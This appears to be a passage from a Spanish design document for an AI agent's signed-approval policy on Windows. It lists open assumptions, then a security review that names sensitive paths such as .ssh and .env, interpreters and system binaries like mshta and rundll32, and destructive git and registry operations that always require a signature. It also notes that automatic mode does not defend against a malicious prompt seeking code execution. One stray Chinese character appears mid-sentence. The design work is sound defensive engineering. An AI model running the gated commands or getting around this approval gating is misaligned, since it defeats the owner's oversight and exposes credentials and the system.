- **El formato exacto de `ApprovalChallenge` serializado**: `crates/vor-approval/src/lib.rs` no muestra cómo `prepare_write_mcp` lo convierte a `Value`. Asumo que existe un `Serialize` para `ApprovalChallenge` (los campos son públicos y `Serialize`-compatibles) y que la serialización actual es estable. Si el PR requiere cambios de wire, hay que versionar el proto.
- **El campo `workspace_id` firmado en parámetros**: el código actual del gateway no muestra cómo el worker valida que el `workspace_id` del `commit_*` coincida con el del `prepare_*` cuando hay tenant store activo. La sección 4.3 da por hecho que ese binding existe y es robusto; si no, hay que añadirlo en la misma rebanada 5.
- **La implementación de `vor-audit::Ledger`**: no la tengo en el contexto, así que la columna nueva `policy_reason_code` y el rate limiter de la rebanada 6 (test 24) son propuestas. Si `Ledger` no soporta consultas por ventana temporal, hay que añadir un índice o un store auxiliar; no lo pude verificar.
- **El comportamiento del rate limiter bajo concurrencia**: el test 24 es单 thread; la correctness bajo carga real requiere un test de stress multi-hilo que no estaba en el código mostrado. Lo dejo como trabajo explícito para la rebanada 6.
- **Si `command_is_inline_eval` clasifica correctamente ejecutables con rutas absolutas tipo `C:\Python311\python.exe -c …`**: el helper hace `rsplit(['\\', '/']).next()` y recorta `.exe`, así que en principio sí, pero no escribí un test específico para rutas absolutas. Lo añadiría en la rebanada 2 como test 8b.
- **Que `policy.example.yaml` siga parseando con los campos nuevos sin `version: 2`**: la validación exige `version == 1`, así que los campos nuevos deben ser opcionales con `#[serde(default)]`. Lo afirmo en la sección 3.1 pero no lo verifiqué ejecutando el parser.
---

## Revision de seguridad (prevalece sobre el borrador)

**R1. El producto es Windows; el borrador razona en Unix.** Los globs sensibles por defecto deben incluir, ademas de
los de shell: `**/*.ps1`, `**/*.psm1`, `**/*.psd1`, `**/*.bat`, `**/*.cmd`, `**/*.vbs`, `**/*.js` fuera de proyectos
declarados, `**/*.wsf`, `**/*.hta`, `**/*.exe`, `**/*.dll`, `**/*.msi`, `**/*.lnk`, `**/*.url`, `**/*.reg`,
`**/*.scr`; y rutas de persistencia: carpetas de Inicio (`...\Start Menu\Programs\Startup`), perfiles de PowerShell
(`**/WindowsPowerShell/*profile*.ps1`, `**/PowerShell/*profile*.ps1`), `**/.git/**`, `**/.ssh/**`, `**/.env*`,
`**/.github/workflows/**`. Escribir cualquiera de ellos pide firma.

**R2. Interpretes y herramientas de build ejecutan codigo arbitrario.** Ningun interprete (`python`, `node`, `pwsh`,
`powershell`, `cmd`, `wscript`, `cscript`, `mshta`, `rundll32`, `regsvr32`) va en la lista automatica con argumentos
libres. Ejecutar un fichero que el propio agente escribio en la misma sesion pide firma (marca de "escrito por el
agente" en el journal de vor-fs). Las herramientas de build/test (`cargo`, `npm`, `pnpm`, `yarn`, `make`, `msbuild`,
`dotnet`, `pytest`) ejecutan codigo del repositorio (build.rs, scripts de package.json, conftest.py): si el dueno las
permite en automatico, el documento debe decir explicitamente que eso equivale a permitir ejecucion de codigo del
proyecto, y que el modo automatico protege contra accidentes y operaciones destructivas, **no** contra un prompt
malicioso que busque ejecucion de codigo. Por defecto: build/test en automatico solo si el dueno lo activa al instalar.

**R3. Destructivo siempre firmado**, sin excepcion configurable en el piloto: borrar, mover fuera de la carpeta,
sobrescribir un fichero que no fue creado por el agente en la sesion sin precondicion de hash, cambiar permisos/ACL,
`git push`/`reset --hard`/`clean`, instaladores, cambios de servicios, tareas programadas y registro.

**R4. La lista de comandos no se versiona en el repo del producto** (el borrador dice commitear `policy.example.yaml`
como fuente): la politica es del dueno de cada instalacion y vive en su maquina; el repo solo trae el ejemplo.

Orden de implementacion: tras las herramientas de lectura del piloto; rebanadas del borrador con R1-R4 incorporadas.
